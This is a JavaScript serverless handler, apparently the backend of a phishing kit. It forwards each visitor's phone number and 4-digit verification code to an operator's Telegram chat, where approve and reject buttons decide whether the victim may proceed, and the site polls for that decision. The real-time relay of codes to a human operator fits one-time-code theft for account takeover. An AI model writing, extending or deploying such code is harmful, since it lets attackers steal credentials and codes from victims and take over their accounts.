globalThis.verificationStore = globalThis.verificationStore || {};

export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in Vercel settings." });
    }

    // 1. WEBSITE POLLING (Checking if admin clicked a button)
    if (req.method === 'GET') {
        const { userId, type } = req.query;
        const key = `${userId}_${type}`;
        const status = globalThis.verificationStore[key] || 'pending';

        if (status !== 'pending') {
            delete globalThis.verificationStore[key];
        }
        return res.status(200).json({ status: status });
    }

    // 2. POST REQUESTS (Website Sending Data OR Telegram Button Clicks)
    if (req.method === 'POST') {
        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

            // A. TELEGRAM BUTTON CLICKED
            if (body.callback_query) {
                const callback = body.callback_query;
                const [action, userId, type] = callback.data.split('_');

                globalThis.verificationStore[`${userId}_${type}`] = action === 'approve' ? 'approved' : 'rejected';

                const originalText = callback.message.text;
                let statusText = action === 'approve' 
                    ? `\n\n✅ <b>${type} APPROVED</b> - User can proceed` 
                    : `\n\n❌ <b>${type} REJECTED</b> - User must try again`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: originalText + statusText,
                        parse_mode: 'HTML'
                    })
                });

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callback.id })
                });

                return res.status(200).send('OK');
            }

            // B. WEBSITE SENDING DATA
            if (body.action === 'send') {
                const { type, userId, data } = body;
                const time = new Date().toLocaleString();
                
                // Thor Verification Format
                let message = `# Thor - ${type} Verification\n`;
                message += `<b>${type} VERIFICATION NEEDED</b>\n\n`;
                message += `<b>USER DETAILS:</b>\n`;
                message += `• Phone Number: ${data.phone}\n`;
                message += `• ${type} Code: <code>${data.value}</code>\n`;
                message += `• Username & Pass: user_${userId}\n`;
                message += `• Time: ${time}\n`;
                message += `• Bot: user75\n\n`;
                message += `Verify the ${type}:\n`;
                message += `• ${type} Length: 4 digits\n`;
                message += `• Timeout: 5 minutes\n`;

                const keyboard = {
                    inline_keyboard: [
                        [
                            { text: `✅ Correct ${type}`, callback_data: `approve_${userId}_${type}` },
                            { text: `❌ Wrong ${type}`, callback_data: `reject_${userId}_${type}` }
                        ]
                    ]
                };

                const tgResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: message, 
                        parse_mode: 'HTML',
                        reply_markup: keyboard
                    })
                });

                if (!tgResponse.ok) {
                    const errData = await tgResponse.json();
                    return res.status(500).json({ error: "Telegram Error: " + errData.description });
                }

                return res.status(200).json({ success: true });
            }

        } catch (error) {
            console.error(error);
            return res.status(500).json({ error: error.message });
        }
    }

    return res.status(405).json({ error: 'Method not allowed' });
}
